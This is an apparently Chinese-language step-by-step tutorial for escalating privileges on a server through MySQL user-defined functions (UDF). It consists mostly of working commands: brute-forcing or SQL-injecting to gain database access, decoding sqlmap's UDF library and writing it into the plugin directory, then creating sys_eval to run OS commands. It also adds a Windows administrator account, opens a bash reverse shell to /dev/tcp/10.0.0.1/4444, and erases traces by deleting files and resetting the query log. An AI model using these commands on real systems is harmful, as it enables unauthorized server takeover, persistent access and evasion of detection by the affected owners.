MySQL UDF提权完整流程
核心流程概述
UDF (User Defined Function) 提权的本质是：将自定义的动态链接库文件写入MySQL插件目录，创建可执行系统命令的函数，从而获取服务器权限。

第一步：获取MySQL高权限账户
需要满足以下条件之一：

MySQL 3306端口弱口令爆破

SQL注入获得 --sql-shell 模式

网站配置文件泄露数据库密码

CVE-2012-2122漏洞绕过认证

第二步：确认提权条件
2.1 查看MySQL版本
sql
mysql> select version();
+-----------+
| version() |
+-----------+
| 5.5.61    |
+-----------+
2.2 查看插件目录位置
sql
mysql> show variables like '%plugin%';
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
2.3 查看secure_file_priv限制（用于写入文件）
sql
mysql> show global variables like '%secure_file_priv%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |   # 空值表示无限制
+------------------+-------+
2.4 查看MySQL运行用户权限
sql
mysql> select system_user();
+----------------+
| system_user()  |
+----------------+
| root@localhost |   # 最好是root权限
+----------------+
第三步：准备UDF动态链接库
3.1 获取动态链接库文件
来源1：sqlmap自带（需解码）

bash
# sqlmap解码32位Linux库
python3 /path/to/sqlmap/extra/cloak/cloak.py -d \
-i /path/to/sqlmap/data/udf/mysql/linux/32/lib_mysqludf_sys.so_ \
-o lib_mysqludf_sys_32.so

# 解码64位Linux库
python3 /path/to/sqlmap/extra/cloak/cloak.py -d \
-i /path/to/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ \
-o lib_mysqludf_sys_64.so
来源2：Metasploit自带（直接使用）

bash
# MSF库文件位置（无需解码）
/usr/share/metasploit-framework/data/exploits/mysql/
3.2 支持的提权函数
动态链接库中包含以下函数：

sys_eval() - 执行任意命令并返回输出

sys_exec() - 执行命令返回退出码

sys_get() - 获取环境变量

sys_set() - 设置环境变量

第四步：上传动态链接库
4.1 方法一：SQL注入写文件（需secure_file_priv无限制）
bash
# 使用sqlmap上传
sqlmap -u "http://target.com/page?id=1" \
--file-write="/local/path/lib_mysqludf_sys_64.so" \
--file-dest="/usr/lib/mysql/plugin/udf.so"
4.2 方法二：原生SQL十六进制写入
步骤1：将so文件转为十六进制

bash
# 在本地将文件转为十六进制
xxd -p lib_mysqludf_sys_64.so | tr -d '\n'
步骤2：通过SQL写入

sql
-- 方法A：直接写入十六进制
SELECT 0x7f454c4602010100000000000000000002003e0001000000...
INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- 方法B：先转十六进制再写入
SELECT unhex('7f454c4602010100000000000000000002003e0001000000...')
INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
步骤3：从文件读取十六进制（更方便）

sql
-- 先将本地文件hex编码保存到数据库
SELECT hex(load_file('/tmp/lib_mysqludf_sys_64.so'))
INTO DUMPFILE '/tmp/udf_hex.txt';

-- 然后写入目标位置
SELECT unhex(load_file('/tmp/udf_hex.txt'))
INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
4.3 方法三：通过Webshell上传
如果有Webshell权限，直接上传so/dll文件到插件目录。

第五步：创建UDF函数
5.1 创建函数
sql
mysql> CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
Query OK, 0 rows affected (0.00 sec)

mysql> CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
Query OK, 0 rows affected (0.00 sec)
5.2 验证函数是否创建成功
sql
mysql> select * from mysql.func;
+----------+-----+---------+----------+
| name     | ret | dl      | type     |
+----------+-----+---------+----------+
| sys_eval |   0 | udf.so  | function |
| sys_exec |   0 | udf.so  | function |
+----------+-----+---------+----------+
第六步：执行系统命令
6.1 基础命令执行
sql
-- 查看当前用户
mysql> select sys_eval('whoami');
+--------------------+
| sys_eval('whoami') |
+--------------------+
| mysql              |
+--------------------+

-- 查看系统信息
mysql> select sys_eval('uname -a');
+----------------------+
| sys_eval('uname -a') |
+----------------------+
| Linux hostname 3.10.0 |
+----------------------+
6.2 Windows环境添加用户
sql
-- 添加新用户
mysql> select sys_eval('net user hacker P@ssw0rd /add');

-- 添加到管理员组
mysql> select sys_eval('net localgroup administrators hacker /add');
6.3 Linux环境反弹Shell
sql
-- 反弹bash shell
mysql> select sys_eval('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');
第七步：清理痕迹
7.1 删除UDF函数
sql
mysql> DROP FUNCTION sys_eval;
mysql> DROP FUNCTION sys_exec;
7.2 删除动态链接库文件
bash
# 通过系统命令删除
mysql> select sys_eval('rm -f /usr/lib/mysql/plugin/udf.so');

# 或通过SQL删除（如果secure_file_priv允许）
mysql> select unhex('') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
7.3 清理MySQL日志中的命令记录
sql
-- 清空通用查询日志
mysql> set global general_log = 'OFF';
mysql> set global general_log = 'ON';
常见错误及解决方案
错误信息	原因	解决方案
Can't open shared library	库文件架构不匹配	尝试使用32位或64位版本
ERROR 1126 (HY000)	插件目录不可写	需要MySQL高权限用户
secure_file_priv is NULL	禁止文件写入	寻找其他提权方式
Function already exists	函数名已存在	使用其他函数名